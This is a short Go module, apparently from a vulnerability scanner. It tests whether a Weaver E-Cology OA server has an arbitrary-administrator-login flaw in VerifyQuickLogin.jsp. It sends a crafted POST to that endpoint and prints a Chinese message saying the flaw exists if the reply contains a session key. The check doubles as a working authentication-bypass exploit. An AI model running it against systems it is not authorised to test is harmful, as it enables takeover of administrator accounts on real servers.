package ecology_VerifyQuickLogin

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/mobile/plugin/VerifyQuickLogin.jsp"
	formData := map[string]string{
		"identifier": "1",
		"language":   "1",
		"ipaddress":  "x.x.x.x",
	}
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).
		SetFormData(formData).
		Post(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		return strings.Contains(resp.String(), "sessionkey")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		vulnUrl := url + "/mobile/plugin/VerifyQuickLogin.jsp"
		color.Green.Println("[+19] 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-19] 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞不存在")
	}
}
